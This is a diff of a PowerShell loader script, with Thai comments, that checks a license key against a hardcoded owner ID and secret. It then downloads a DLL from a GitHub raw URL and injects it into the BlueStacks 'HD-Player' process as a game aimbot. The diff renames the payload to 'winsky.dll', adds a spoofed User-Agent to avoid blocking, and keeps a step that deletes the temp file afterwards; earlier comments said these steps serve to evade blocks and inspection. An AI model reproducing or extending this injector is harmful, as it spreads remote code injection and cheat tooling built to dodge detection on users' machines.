@@ -1,3 +1,5 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 $Name    = "Relaxwtf777's Application"
 $OwnerID = "W404AorT6U"
 $Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
@@ -43,15 +45,16 @@ function Show-Auth {
 }
 
 if (Show-Auth) {
-    # ตรวจสอบชื่อไฟล์ให้ตรงกับ GitHub
-    $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/AimbotFemaleFix.dll"
+    # แก้ไขลิงก์เป็น winsky.dll ตามที่คุณเปลี่ยนชื่อไฟล์ใน GitHub
+    $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/winsky.dll"
     $tempPath = "$env:TEMP\sys_node_cache.dll"
     $targetProc = "HD-Player"
 
     Write-Host "[*] Syncing data with node-storage..." -ForegroundColor Yellow
     try {
-        # เปลี่ยนมาใช้ WebClient เพื่อลดโอกาสโดนบล็อกในเครื่องลูกค้า
         $webClient = New-Object System.Net.WebClient
+        # ปลอมแปลง User-Agent เพื่อป้องกันบางระบบบล็อกสคริปต์
+        $webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)")
         $webClient.DownloadFile($dllUrl, $tempPath)
     } catch {
         Write-Host "[!] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
@@ -85,9 +88,9 @@ if (Show-Auth) {
     Add-Type -TypeDefinition $Source
     [NodeHandler]::StartNode($tempPath, $targetProc)
     Write-Host "[+] Injection Completed. Aimbot Active." -ForegroundColor Green
-    # ลบไฟล์ชั่วคราวทิ้งทันทีเพื่อป้องกันการตรวจสอบ
+    # ลบไฟล์ชั่วคราวทิ้งทันที
     Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
 } else {
-    Write-Host "Closing in 3 seconds..."
-    Start-Sleep -Seconds 3
+    Write-Host "Closing in 5 seconds..."
+    Start-Sleep -Seconds 5
 }
